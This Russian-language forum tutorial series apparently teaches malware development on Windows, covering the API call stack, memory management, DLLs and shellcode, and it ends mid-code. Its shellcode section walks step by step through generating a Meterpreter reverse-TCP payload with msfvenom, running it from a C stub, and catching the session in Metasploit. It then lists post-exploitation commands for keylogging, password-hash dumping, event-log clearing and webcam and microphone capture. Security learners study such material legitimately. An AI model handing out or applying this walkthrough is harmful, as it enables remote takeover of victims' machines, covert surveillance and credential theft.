<li data-xf-list-type="ol">Процессы пользователя - это программа/приложение, выполненное пользователем, такое как Notepad, Google Chrome или Microsoft Word.</li>
<li data-xf-list-type="ol">Библиотеки DLL подсистемы - DLL, которые содержат функции API, вызываемые процессами пользователя. Примером этого может служить kernel32.dll, экспортирующая функцию CreateFile Windows API (WinAPI), другими общими DLL подсистемы являются ntdll.dll, advapi32.dll и user32.dll.</li>
<li data-xf-list-type="ol">Ntdll.dll - это системная DLL, которая является самым низким слоем, доступным в режиме пользователя. Это специальная DLL, которая создает переход из режима пользователя в режим ядра. Это часто называют Native API или NTAPI.</li>
<li data-xf-list-type="ol">Executive Kernel - это то, что известно как Windows Kernel, и оно вызывает другие драйверы и модули, доступные в режиме ядра, чтобы выполнить задачи. Ядро Windows частично хранится в файле под названием ntoskrnl.exe по пути &quot;C:\Windows\System32&quot;.</li>
</ol>Ниже показан пример приложения, которое создает файл. Это начинается с приложения пользователя, вызывающего функцию createrFile WinAPI, доступную в kernel32.dll. Kernel32.dll - это важная DLL, которая открывает приложениям доступ к WinAPI, и поэтому ее можно увидеть загруженной большинством приложений.<br />
<br />
Затем, createFile вызывает свою эквивалентную функцию NTAPI, NtCreateFile, которая предоставляется через ntdll.dll.<br />
Ntdll.dll затем выполняет команду <b>sysenter (x86)</b> или <b>syscall (x64)</b>, которая переводит выполнение в режим ядра.<br />
<br />
Затем используется функция ядра ntcreaterFile, которая вызывает драйверы ядра и модули для выполнения запрашиваемой задачи.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709124184.png"
		data-src="https://osint42.org/attachments/1746709124184-png.28/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709124184-png.28/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709124184.png"
			title="1746709124184.png"
			width="1090" height="643" loading="lazy" />
	</div><br />
<br />
<b>Пример стека вызова функций</b><br />
<br />
Этот пример показывает стека вызова функций через отладчик. Это делается путем подключения отладчика к бинарному файлу, который создает файл через API Windows createFilew.<br />
<br />
Пользовательское приложение вызывает функцию createrFilew WinAPI.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709130757.png"
		data-src="https://osint42.org/attachments/1746709130757-png.29/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709130757-png.29/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709130757.png"
			title="1746709130757.png"
			width="622" height="261" loading="lazy" />
	</div><br />
<br />
Далее, вызов из CreateFileW функции NtCreateFile.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709136535.png"
		data-src="https://osint42.org/attachments/1746709136535-png.30/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709136535-png.30/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709136535.png"
			title="1746709136535.png"
			width="620" height="175" loading="lazy" />
	</div><br />
<br />
Наконец, функция NtCreateFile использует инструкцию syscall для перехода из режима пользователя в режим ядра.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709141924.png"
		data-src="https://osint42.org/attachments/1746709141924-png.31/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709141924-png.31/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709141924.png"
			title="1746709141924.png"
			width="620" height="175" loading="lazy" />
	</div><br />
<br />
<b><u>Ядро затем создает файл.</u><br />
<br />
Прямой вызов Native API (NTAPI)</b><br />
<br />
Важно отметить, что приложения могут вызывать syscalls (т.е. функции NTDLL) напрямую, не обращаясь к API Windows.<br />
<br />
API Windows просто действует как оболочка для Native API. Сказав это, стоит отметить, что Native API сложнее в использовании, потому что он официально не документирован Microsoft.<br />
Более того, Microsoft советует не использовать функции Native API, потому что они могут быть изменены в любое время без предупреждения.<br />
<br />
<b><u>Теперь рассмотрим управление памятью в Windows</u></b><br />
<br />
Виртуальная память и разбиение на страницы<br />
<br />
Память в современных операционных системах не отображается напрямую на физическую память (т.е. оперативную память). Вместо этого процессы используют виртуальные адреса памяти, которые отображаются на физические адреса памяти. Причин для этого несколько, но в конечном итоге цель состоит в том, чтобы сохранить как можно больше физической памяти.<br />
<br />
Виртуальная память может быть отображена на физическую память, но может также храниться на диске. С помощью виртуального адресования памяти становится возможным для нескольких процессов делить один и тот же физический адрес, имея уникальный виртуальный адрес памяти.<br />
Виртуальная память опирается на концепцию разбиения памяти на страницы, которое делит память на блоки по 4КБ, называемые &quot;страницами&quot;.<br />
<br />
Смотрите изображение ниже из книги &quot;Windows Internals 7th edition - part 1&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709155449.png"
		data-src="https://osint42.org/attachments/1746709155449-png.32/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709155449-png.32/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709155449.png"
			title="1746709155449.png"
			width="460" height="281" loading="lazy" />
	</div><br />
<br />
Страницы, находящиеся в виртуальном адресном пространстве процесса, могут находиться в одном из 3 состояний:<br />
<ol>
<li data-xf-list-type="ol">Свободная - Страница ни в чем не участвует, она недоступна для процесса. Она доступна для резервирования или коммитирования.</li>
<li data-xf-list-type="ol">Зарезервированная - Страница зарезервирована для будущего использования. Диапазон адресов не может быть использован другими функциями выделения. Страница не доступна и не связана с физическим хранилищем. Она доступна для коммитирования.</li>
<li data-xf-list-type="ol">Закоммитированная - Страница доступна и доступ к ней контролируется одной из констант защиты памяти. Система инициализирует и загружает каждую коммитированную страницу в физическую память только при первой попытке чтения или записи на эту страницу. Когда процесс завершается, система освобождает хранилище для закоммитированных страниц.</li>
</ol>Как только страницы закоммитированы, им необходимо установить параметр защиты. Список констант защиты памяти можно найти <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank" class="link link--external" rel="noopener">здесь</a>, но ниже приведены некоторые примеры.<br />
<ul>
<li data-xf-list-type="ul">PAGE_NOACCESS - отключает все доступы к закоммитированному региону страниц. Попытка чтения из этого региона, записи в него или выполнения команд приведет к нарушению доступа.</li>
<li data-xf-list-type="ul">PAGE_EXECUTE_READWRITE - включает чтение, запись и выполнение. Этот параметр крайне не рекомендуется к использованию и обычно является плохим показателем, поскольку память редко может быть одновременно доступна для записи и выполнения.</li>
<li data-xf-list-type="ul">PAGE_READONLY - включает только чтение в закоммитированном регионе страниц. Попытка записи в закоммитированный регион приведет к нарушению доступа.</li>
</ul>Защита памяти<br />
<br />
Современные операционные системы обычно имеют встроенные механизмы защиты памяти для предотвращения эксплуатации и атак. Это также важно учитывать, так как они, скорее всего, будут встречаться при создании или отладке вредоносного ПО.<br />
<ul>
<li data-xf-list-type="ul">Предотвращение выполнения данных (DEP) - DEP это функция защиты памяти на уровне системы, которая встроена в операционную систему, начиная с Windows XP и Windows Server 2003. Если параметр защиты страницы установлен в PAGE_READONLY, то DEP предотвратит выполнение кода в этом регионе памяти.</li>
<li data-xf-list-type="ul">Случайное расположение адресного пространства (ASLR) - ASLR это техника защиты памяти, используемая для предотвращения эксплуатации уязвимостей направленные на адреса памяти. ASLR случайным образом меняет положение ключевых областей данных процесса в адресном пространстве, включая базу исполняемого файла и положения стека, кучи и библиотек.</li>
</ul>При работе с процессами Windows важно знать, является ли процесс x86 или x64. Процессы x86 имеют меньшее адресное пространство памяти - 4 ГБ (0xFFFFFFFF), тогда как у x64 намного больше - 128 ТБ (0xFFFFFFFFFFFFFFFF).<br />
<br />
<b>Пример выделения памяти</b><br />
<br />
В этом примере рассматриваются небольшие фрагменты кода, чтобы лучше понять, как можно взаимодействовать с памятью Windows через функции С и Windows API. Первый шаг во взаимодействии с памятью - это выделение памяти. Ниже приведен фрагмент кода, который демонстрирует несколько способов выделения памяти, что в сущности сводится к резервированию памяти внутри выполняющегося процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Allocating а memory buffer 100 bytes

// Method 1 — Using malloc()
PVOID pAddress = malloc(100);

// Method 2 — Using НеарА11ос ()
PVOID pAddress = HeapAlloc (GetProcessHeap (), 0, 100);

// Method 3 — Using LocalAlloc ()
PVOID pAddress = LocalAlloc(LPTR, 100);</code></pre>
	</div>
</div><br />
Функции выделения памяти возвращают базовый адрес, который является просто указателем на начало выделенного блока памяти. Используя приведенные выше фрагменты, pAddress будет базовым адресом выделенного блока памяти. Используя этот указатель, можно выполнить несколько действий, таких как чтение, запись и выполнение. Типы действий, которые могут быть выполнены, будут зависеть от защиты, назначенной выделенному региону памяти.<br />
<br />
Ниже приведен образец того, как выглядит pAddress в отладчике.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709169357.png"
		data-src="https://osint42.org/attachments/1746709169357-png.33/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709169357-png.33/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709169357.png"
			title="1746709169357.png"
			width="837" height="289" loading="lazy" />
	</div><br />
<br />
Когда память выделена, она может быть либо заполнена нулями, либо содержать случайные данные. Некоторые функции выделения памяти предоставляют опцию обнуления региона памяти в процессе выделения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709175008.png"
		data-src="https://osint42.org/attachments/1746709175008-png.34/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709175008-png.34/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709175008.png"
			title="1746709175008.png"
			width="836" height="323" loading="lazy" />
	</div><br />
<br />
Следующим шагом после выделения памяти обычно является запись в этот буфер. Для записи в память можно использовать несколько функций, но в этом примере используется memcpy.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>PVOID pAddress = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, 100);
CHAR* cString = &quot;Malware Academy Is The Best&quot;;

memcpy (pAddress, cString, strlen(cString));</code></pre>
	</div>
</div><br />
HeapAlloc использует флаг HEAP_ZERO_MEMORY, который приводит к инициализации выделенной памяти нулями. Затем строка копируется в выделенную память с помощью memcpy. Последний параметр в memcpy - это количество байтов, которые нужно скопировать.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709189794.png"
		data-src="https://osint42.org/attachments/1746709189794-png.35/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709189794-png.35/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709189794.png"
			title="1746709189794.png"
			width="839" height="399" loading="lazy" />
	</div><br />
<br />
<b>Отмечу что указанный пример не безопасен, т.к. strlen не учитывает нулевой символ в конце, лучше использовать специализированные функции для работы со строками, например strcpy.<br />
Но для демонстрации работы с памятью, пример сойдет.)</b><br />
<br />
Когда приложению больше не нужен выделенный буфер, настоятельно рекомендуется освободить буфер, чтобы избежать утечек памяти. В зависимости от того, какая функция использовалась для выделения памяти, у нее будет соответствующая функция освобождения памяти. Например:<br />
<ul>
<li data-xf-list-type="ul">При выделении памяти с помощью malloc требуется использование функции free.</li>
<li data-xf-list-type="ul">При выделении памяти с помощью HeapAlloc требуется использование функции HeapFree.</li>
<li data-xf-list-type="ul">При выделении памяти с помощью LocalAlloc требуется использование функции LocalFree.</li>
</ul>На рисунках ниже показано действие HeapFree, освобождающее выделенную память по адресу 000002320E449900. Обратите внимание, что адрес 000002320E449900 по-прежнему существует в процессе, но его исходное содержимое было перезаписано случайными данными. Эти новые данные, скорее всего, связаны с новым выделением, выполненным ОС внутри процесса.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709199557.png"
		data-src="https://osint42.org/attachments/1746709199557-png.36/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709199557-png.36/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709199557.png"
			title="1746709199557.png"
			width="835" height="496" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709205577.png"
		data-src="https://osint42.org/attachments/1746709205577-png.37/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709205577-png.37/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709205577.png"
			title="1746709205577.png"
			width="842" height="491" loading="lazy" />
	</div><br />
<br />
Также рекомендуется после освобождения памяти устанавливать значение указателю nullptr, что-бы не было возможности повторно использовать невалидный адрес в программе.)<br />
<br />
В следующей части рассмотрим работу с Windows API.</div>
						

							<h2>Что такое payload и shell code</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746731451731.png"
		data-src="https://osint42.org/attachments/1746731451731-png.42/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731451731-png.42/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731451731.png"
			title="1746731451731.png"
			width="1024" height="640" loading="lazy" />
	</div><br />
<br />
<b>Что такое шелл-код?</b><br />
<br />
Шелл-код (Он-же Payload) – это набор инструкций машинного кода, который может быть выполнен при внедрении в другой процесс. Он часто используется в эксплойтах для получения контроля над системой.<br />
<br />
<b>Есть способы генерации простеньких шелл-кодов:</b><br />
<br />
Создание и использование шеллкода при помощи инструментов, таких как msvenom и Metasploit, довольно популярно среди исследователей безопасности и пентестеров. Давайте рассмотрим, как создать шеллкод и внедрить его в программу на языке С.<br />
<br />
<b>Шаг 1: Создание шеллкода с помощью msvenom</b><br />
<br />
msvenom - это инструмент, входящий в состав Metasploit Framework, который позволяет создавать различные виды пейлоадов.<br />
<br />
Большинство дистрибутивов Linux позволяют легко установить Metasploit. Пример установки на Kali Linux или Debian:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>sudo apt-get update
sudo apt-get install metasploit-framework</code></pre>
	</div>
</div><br />
После установки и запуска msvenom, вы можете просмотреть доступные опции и параметры:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msvenom --help</code></pre>
	</div>
</div><br />
Хотя Metasploit и разработан преимущественно для Linux, есть версия для Windows, но установка может быть менее тривиальной. Рекомендуется использовать виртуальную машину с Linux (например, Kali Linux) на вашем компьютере под Windows для работы с Metasploit.<br />
<br />
Итак, допустим, вы хотите создать обратное TCP-соединение (reverse shell) от целевой машины к вашей машине. Вы можете сгенерировать шеллкод следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>msvenom -p windows/meterpreter/reverse_tcp LHOST=ваш_ип LPORT=4444 -f c</code></pre>
	</div>
</div><br />
Это создаст C-представление шеллкода, где LHOST - это IP-адрес вашей машины, а LPORT - порт, на который вы хотите, чтобы целевая машина подключилась.<br />
<br />
<b>Шаг 2: Внедрение шеллкода в программу на С</b><br />
<br />
После создания шеллкода с помощью msvenom, вам будет предоставлен код на языке C, который вы можете скопировать и использовать в вашей программе:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>unsigned char buf[] =
&quot;\x00\x00\x00...&quot;; // здесь будет ваш шеллкод

int main(int argc, char **argv) {
    void (*func)();
    func = (void (*)()) buf;
    func();
    return 0;
}</code></pre>
	</div>
</div><br />
<b>Шаг 3: Ожидание обратного соединения</b><br />
<br />
Запустите Metasploit и используйте подходящий exploit/multi/handler для прослушивания обратного соединения:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ваш_ип
set LPORT 4444
run</code></pre>
	</div>
</div><br />
Теперь, когда вы запустите свою программу на Си, она создаст обратное соединение к вашему Metasploit, и вы получите доступ к meterpreter на целевой машине.<br />
<br />
После того как целевая машина подключится, вы увидите номер сессии. Вы можете взаимодействовать с этой сессией используя:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>sessions -i номер_сессии</code></pre>
	</div>
</div><br />
Например:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>sessions -i 1</code></pre>
	</div>
</div><br />
Теперь вы находитесь в Meterpreter и можете выполнять различные команды.<br />
<br />
Meterpreter — это динамический и расширяемый инструмент, который предоставляется Metasploit и позволяет выполнять множество функций на компрометированной машине. Вот некоторые из действий, которые можно выполнять в сессии Meterpreter:<br />
<ol>
<li data-xf-list-type="ol"><b>Сбор информации</b>:<ul>
<li data-xf-list-type="ul">sysinfo: Получение информации о системе, включая версию ОС, имя хоста и архитектуру.</li>
<li data-xf-list-type="ul">getuid: Получение идентификатора текущего пользователя.</li>
<li data-xf-list-type="ul">getpid: Получение ID текущего процесса.</li>
<li data-xf-list-type="ul">ps: Просмотр списка запущенных процессов.</li>
<li data-xf-list-type="ul">ipconfig: Получение информации о сетевых интерфейсах.</li>
<li data-xf-list-type="ul">route: Просмотр таблицы маршрутизации.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Управление файловой системой</b>:<ul>
<li data-xf-list-type="ul">ls: Просмотр содержимого директории.</li>
<li data-xf-list-type="ul">cd: Изменение текущей директории.</li>
<li data-xf-list-type="ul">upload и download: Загрузка и скачивание файлов между вашей машиной и целевой системой.</li>
<li data-xf-list-type="ul">cat: Чтение содержимого файла.</li>
<li data-xf-list-type="ul">edit: Редактирование файла.</li>
<li data-xf-list-type="ul">rm: Удаление файла.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Управление процессами</b>:<ul>
<li data-xf-list-type="ul">migrate PID: Перемещение Meterpreter в другой процесс (где PID — это ID процесса).</li>
<li data-xf-list-type="ul">kill: Убийство процесса.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Управление сетью</b>:<ul>
<li data-xf-list-type="ul">portfwd: Настройка переадресации портов.</li>
<li data-xf-list-type="ul">netstat: Просмотр активных сетевых соединений.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Подключение к системе</b>:<ul>
<li data-xf-list-type="ul">shell: Запуск командной оболочки на целевой системе.</li>
<li data-xf-list-type="ul">execute: Запуск команды или программы на целевой системе.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Привилегии</b>:<ul>
<li data-xf-list-type="ul">getsystem: Попытка повысить привилегии до SYSTEM.</li>
<li data-xf-list-type="ul">hashdump: Выгрузка хэшей паролей из системы.</li>
<li data-xf-list-type="ul">clearev: Очистка журналов событий.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Взаимодействие с экраном и вводом</b>:<ul>
<li data-xf-list-type="ul">screenshot: Получение скриншота рабочего стола.</li>
<li data-xf-list-type="ul">keyscan_start: Начало перехвата клавиатуры.</li>
<li data-xf-list-type="ul">keyscan_dump: Выгрузка собранных данных перехвата клавиатуры.</li>
<li data-xf-list-type="ul">keyscan_stop: Остановка перехвата клавиатуры.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Управление аудио и видео</b>:<ul>
<li data-xf-list-type="ul">webcam_list: Список доступных камер.</li>
<li data-xf-list-type="ul">webcam_snap: Снимок с веб-камеры.</li>
<li data-xf-list-type="ul">record_mic: Запись звука с микрофона.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Управление токенами и сессиями</b>:<ul>
<li data-xf-list-type="ul">use incognito: Загрузка расширения для управления токенами и выполнения действий от имени других пользователей.</li>
<li data-xf-list-type="ul">list_tokens -u: Перечисление доступных токенов пользователей.</li>
</ul></li>
<li data-xf-list-type="ol"><b>Работа с расширениями</b>:<ul>
<li data-xf-list-type="ul">load &lt;extension_name&gt;: Загрузка дополнительных модулей и расширений.</li>
</ul></li>
</ol>Это лишь краткий обзор возможностей Meterpreter. Помимо этого, есть множество других команд и расширений, которые позволяют выполнять конкретные действия на различных платформах и в различных сценариях.<br />
Чтобы получить полный список доступных команд в Meterpreter, введите help в сессии Meterpreter.<br />
<br />
<b>Вот некоторые типы шеллкодов, которые можно создать с помощью msvenom:</b><br />
<ol>
<li data-xf-list-type="ol"><b>Обратные оболочки (Reverse Shells)</b>: Эти пейлоуды устанавливают соединение с атакующим и предоставляют ему оболочку на атакуемой машине. Пример: windows/meterpreter/reverse_tcp.</li>
<li data-xf-list-type="ol"><b>Привязанные оболочки (Bind Shells)</b>: Эти пейлоуды слушают входящие соединения на целевой машине и предоставляют оболочку, когда атакующий подключается. Пример: windows/meterpreter/bind_tcp.</li>
<li data-xf-list-type="ol"><b>Пейлоуды для создания учетных записей</b>: Создают новую учетную запись на целевой системе. Пример: windows/adduser.</li>
<li data-xf-list-type="ol"><b>Командные пейлоуды</b>: Выполняют определенную команду на целевой системе. Пример: cmd/unix/reverse_python.</li>
<li data-xf-list-type="ol"><b>Пейлоуды для скачивания и выполнения</b>: Скачивают и выполняют файл с определенного URL. Пример: windows/download_exec.</li>
<li data-xf-list-type="ol"><b>Пейлоуды для выключения или перезагрузки</b>: Пример: windows/shutdown.</li>
<li data-xf-list-type="ol"><b>Metsvc (Meterpreter Service)</b>: Создает постоянный сервис Meterpreter на целевой системе.</li>
<li data-xf-list-type="ol"><b>Payloads для различных платформ</b>: msvenom поддерживает множество платформ, включая Windows, Linux, macOS, Android, и другие.</li>
<li data-xf-list-type="ol"><b>Инъекции в память</b>: Пейлоуды, которые могут быть инжектированы непосредственно в память и выполнены без записи на диск.</li>
<li data-xf-list-type="ol"><b>Пейлоуды для обхода антивирусов</b>: Некоторые пейлоуды могут быть созданы так, чтобы обходить определенные антивирусные решения или их характеристики.</li>
<li data-xf-list-type="ol"><b>И многие другие...</b></li>
</ol>Чтобы получить полный список доступных пейлоудов в msvenom, вы можете выполнить:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msvenom --list payloads</code></pre>
	</div>
</div><br />
Для создания конкретного шеллкода используйте команду в следующем формате:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msvenom -p [payload] [options]</code></pre>
	</div>
</div><br />
Где [payload] - это имя выбранного пейлоуда, а [options] - это различные параметры, такие как IP-адрес, порт, формат вывода и другие параметры, зависящие от выбранного пейлоуда.<br />
<br />
Таким образом, msvenom предоставляет гибкие инструменты для создания разнообразных шеллкодов в зависимости от ваших потребностей.</div>
						

							<h2>Изучаем динамические библиотеки</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746731860013.png"
		data-src="https://osint42.org/attachments/1746731860013-png.43/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731860013-png.43/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731860013.png"
			title="1746731860013.png"
			width="600" height="600" loading="lazy" />
	</div><br />
<br />
В этой статье предлагаю рассмотреть создание динамических библиотек, в винде это всем наверное известные DLL.)<br />
<br />
И .exe, и .dll файлы считаются исполняемыми файлами, в формате PE, сам PE уже описан много где, нет не времени не желание описывать архитектуру, если интересно всё в сети есть и очень разжованно.)<br />
<br />
<b>Что такое DLL?</b><br />
<br />
DLL - это общие библиотеки исполняемых функций или данных, которые могут использоваться несколькими приложениями одновременно. Они используются для экспорта функций, которые будут использоваться процессом. В отличие от EXE файлов, DLL файлы не могут исполнять код самостоятельно. Вместо этого библиотеки DLL необходимо загрузить другими программами для выполнения кода.<br />
<br />
Например функция createFile экспортирована из kernel32.dll, поэтому если процесс хочет вызвать эту функцию, ему сначала нужно загрузить kernel32.dll в свое адресное пространство.<br />
<br />
Некоторые DLL автоматически загружаются в каждый процесс по умолчанию, так как эти DLL экспортируют функции, необходимые для правильного выполнения процесса.<br />
<br />
Несколько примеров таких DLL: ntdll.dll, kernel32.dll и kernelbase.dll.<br />
<br />
В PocessExplorer показанно какие dll загружены в процесс explorer.exe:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731873179.png"
		data-src="https://osint42.org/attachments/1746731873179-png.44/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731873179-png.44/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731873179.png"
			title="1746731873179.png"
			width="699" height="357" loading="lazy" />
	</div><br />
<br />
<b>Системный Базовый Адрес DLL</b><br />
<br />
ОС Windows использует системный базовый адрес DLL, чтобы загружать некоторые DLL по одному и тому же базовому адресу в виртуальном адресном пространстве всех процессов на данной машине для оптимизации использования памяти и улучшения производительности системы.<br />
<br />
Следующее изображение показывает, как kernel32.dll загружается по одному и тому же адресу (0x7fff9fad0000) среди нескольких работающих процессов.<br />
<br />
В такой ситуации кодовая область у всех процессов будет одна, но данные будут разные, у каждого процесса свои.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731880866.png"
		data-src="https://osint42.org/attachments/1746731880866-png.45/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731880866-png.45/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731880866.png"
			title="1746731880866.png"
			width="839" height="168" loading="lazy" />
	</div><br />
<br />
<b>Зачем использовать DLL?</b><br />
<br />
Есть несколько причин, почему DLL так часто используются в Windows:<br />
<ol>
<li data-xf-list-type="ol">Модульность кода - вместо одного огромного исполняемого файла, содержащего всю функциональность, код делится на несколько независимых библиотек, каждая из которых фокусируется на конкретной функциональности. Модульность упрощает работу разработчиков во время разработки и отладки.</li>
<li data-xf-list-type="ol">Повторное использование кода - DLL способствуют повторному использованию кода, так как библиотеку можно вызывать из нескольких процессов.</li>
<li data-xf-list-type="ol">Эффективное использование памяти - когда несколько процессов нуждаются в одной и той же DLL, они могут экономить память, разделяя эту DLL, вместо того чтобы загружать ее в память процесса.</li>
</ol><b>Точка входа в DLL</b><br />
<br />
DLL могут по желанию указывать функцию точки входа, которая выполняет код, когда происходит определенная задача, например, когда процесс загружает библиотеку DLL.<br />
<br />
Есть 4 возможности для вызова точки входа:<br />
<ol>
<li data-xf-list-type="ol">Загрузка процессом DLL.</li>
<li data-xf-list-type="ol">Создание процессом нового потока.</li>
<li data-xf-list-type="ol">Нормальный выход потока.</li>
<li data-xf-list-type="ol">Выгрузка процессом DLL.</li>
</ol>Пример кода DLL<br />
<br />
Код ниже показывает типичную структуру кода DLL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL APIENTRY D11Main(
HANDLE hModule, // Handle to DLL module
